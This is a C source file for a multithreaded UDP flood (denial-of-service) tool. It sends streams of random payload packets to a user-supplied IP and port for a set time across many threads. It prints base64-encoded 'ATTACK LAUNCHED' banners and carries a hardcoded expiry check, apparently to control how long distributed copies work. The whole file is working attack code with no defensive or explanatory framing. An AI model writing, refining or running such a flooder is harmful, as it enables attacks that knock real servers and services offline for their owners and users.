#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <errno.h>
#include <time.h>
#include <ctype.h>

#define PACKET_SIZE 8000
#define PAYLOAD_SIZE 100

char *ip;
int port;
int duration;

// Base64 encoded messages
const char *attack_start_message = "QVRUQUNLIExBVU5DSEVEIEBEQU5HRVJfQk9ZX09Q";
const char *attack_finish_message = "QVRUQUNLIEZJTklTSEVEIC0gQERBTkdFUl9CT1lfT1A=";
const char *file_closed_message = "RklMRSBDTE9TRUQgLSBAREFOR0VSX0JPWV9PUA==";

void base64_decode(const char *encoded, char *decoded) {
    const char *base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    int i = 0, j = 0, in_len = strlen(encoded);
    int in_ = 0;
    unsigned char char_array_4[4], char_array_3[3];

    while (in_len-- && (encoded[in_] != '=') && (isalnum(encoded[in_]) || (encoded[in_] == '+') || (encoded[in_] == '/'))) {
        char_array_4[i++] = encoded[in_]; in_++;
        if (i == 4) {
            for (i = 0; i < 4; i++) {
                char_array_4[i] = strchr(base64_chars, char_array_4[i]) - base64_chars;
            }
            char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
            char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
            char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

            for (i = 0; i < 3; i++) {
                decoded[j++] = char_array_3[i];
            }
            i = 0;
        }
    }

    if (i) {
        for (int k = i; k < 4; k++) {
            char_array_4[k] = 0;
        }

        for (int k = 0; k < 4; k++) {
            char_array_4[k] = strchr(base64_chars, char_array_4[k]) - base64_chars;
        }

        char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
        char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
        char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

        for (int k = 0; k < (i - 1); k++) {
            decoded[j++] = char_array_3[k];
        }
    }
    decoded[j] = '\0';
}

void display_message(const char *encoded_message) {
    char decoded_message[256];
    base64_decode(encoded_message, decoded_message);
    printf("%s\n", decoded_message);
}

int is_expired() {
    struct tm expiry_date = {0};
    time_t now;
    double seconds;
    
    // Set the expiry date (year, month, day)
    expiry_date.tm_year = 2025 - 1900;  // Year 2025
    expiry_date.tm_mon = 11 - 1;         // nov. (months are 0-indexed)
    expiry_date.tm_mday = 23;           // 23th day

    time(&now);
    seconds = difftime(mktime(&expiry_date), now);

    if (seconds < 0) {
        display_message(file_closed_message);
        return 1; // Expired
    }
    return 0; // Not expired
}

void generate_payload(char *buffer, size_t size) {
    for (size_t i = 0; i < size; i++) {
        buffer[i * 4] = '\\';
        buffer[i * 4 + 1] = 'x';
        buffer[i * 4 + 2] = "0123456789abcdef"[rand() % 16];
        buffer[i * 4 + 3] = "0123456789abcdef"[rand() % 16];
    }
    buffer[size * 4] = '\0';
}

void *udp_attack(void *args) {
    char **argv = (char **)args;
    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int attack_time = atoi(argv[3]);
    
    struct sockaddr_in server_addr;
    int sock;
    char buffer[PAYLOAD_SIZE * 4 + 1]; 

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        printf("Error: Could not create socket! Reason: %s\n", strerror(errno));
        pthread_exit(NULL);
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(target_port);

    if (inet_pton(AF_INET, target_ip, &server_addr.sin_addr) <= 0) {
        printf("Error: Invalid IP address - %s\n", target_ip);
        close(sock);
        pthread_exit(NULL);
    }

    time_t start_time = time(NULL);
    while (time(NULL) - start_time < attack_time) {
        generate_payload(buffer, PAYLOAD_SIZE);

        if (sendto(sock, buffer, strlen(buffer), 0, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
            printf("Error sending packet: %s\n", strerror(errno));
        }
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        printf("Usage: %s <ip> <port> <time> <threads>\n", argv[0]);
        return 1;
    }

    // Check if the program is expired
    if (is_expired()) {
        return 1; // Exit if expired
    }

    ip = argv[1];
    port = atoi(argv[2]);
    int attack_time = atoi(argv[3]);
    int threads_count = atoi(argv[4]);
    
    display_message(attack_start_message);

    pthread_t threads[threads_count];

    for (int i = 0; i < threads_count; i++) {
        if (pthread_create(&threads[i], NULL, udp_attack, (void*)argv)) {
            printf("Error: Could not create thread %d. Reason: %s\n", i, strerror(errno));
            return 1;
        }
    }

    for (int i = 0; i < threads_count; i++) {
        pthread_join(threads[i], NULL);
    }

    display_message(attack_finish_message);

    return 0;
}

